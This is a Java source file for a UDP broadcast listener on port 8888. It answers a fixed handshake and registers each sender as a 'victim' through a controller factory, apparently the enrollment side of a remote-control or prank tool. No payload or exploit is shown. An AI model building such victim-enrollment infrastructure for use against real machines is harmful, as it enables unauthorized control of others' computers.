package com.master.zueira.server;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Arrays;

import com.master.zueira.controller.VictimControllerFactory;

public class ZueiraDiscover implements Runnable {

	private static final String ACCEPT_MESSAGE = "Zueira connected in:";
	private static final String RESPONSE_MESSAGE = "Zueira on";

	private static ZueiraDiscover INSTANCE;

	public static ZueiraDiscover getInstance() {
		if (INSTANCE == null) {
			synchronized (ACCEPT_MESSAGE) {
				if (INSTANCE == null) {
					INSTANCE = new ZueiraDiscover();
					new Thread(INSTANCE).start();
				}
			}
		}
		return INSTANCE;
	}

	private DatagramSocket socket;

	private ZueiraDiscover() {
	}

	@Override
	public void run() {
		try {
			this.socket = new DatagramSocket(8888, InetAddress.getByName("0.0.0.0"));
			this.socket.setBroadcast(true);
			while (true) {
				System.out.println(this.getClass().getName() + ">>>Ready to receive broadcast packets!");

				final byte[] recvBuf = new byte[15000];
				final DatagramPacket packet = new DatagramPacket(recvBuf, recvBuf.length);
				this.socket.receive(packet);
				receive(packet);
			}
		} catch (final IOException ex) {
			ex.printStackTrace();
		}
	}

	private void receive(DatagramPacket packet) throws IOException {
		String address = packet.getAddress().getHostAddress();
		System.out.println(this.getClass().getName() + ">>>Discovery packet received from: " + address);
		String message[] = new String(packet.getData()).split("\t");
		System.out.println(this.getClass().getName() + ">>>Packet received; data: " + Arrays.toString(message));
		if (message[0].equals(ACCEPT_MESSAGE) && message.length == 3) {
			final byte[] sendData = RESPONSE_MESSAGE.getBytes();
			final DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, packet.getAddress(), packet.getPort());
			this.socket.send(sendPacket);
			VictimControllerFactory.getInstance().getController().addVictim(message[2], address, Integer.valueOf(message[1]));
			System.out.println(this.getClass().getName() + ">>>Sent packet to: " + sendPacket.getAddress().getHostAddress());
		}
	}

}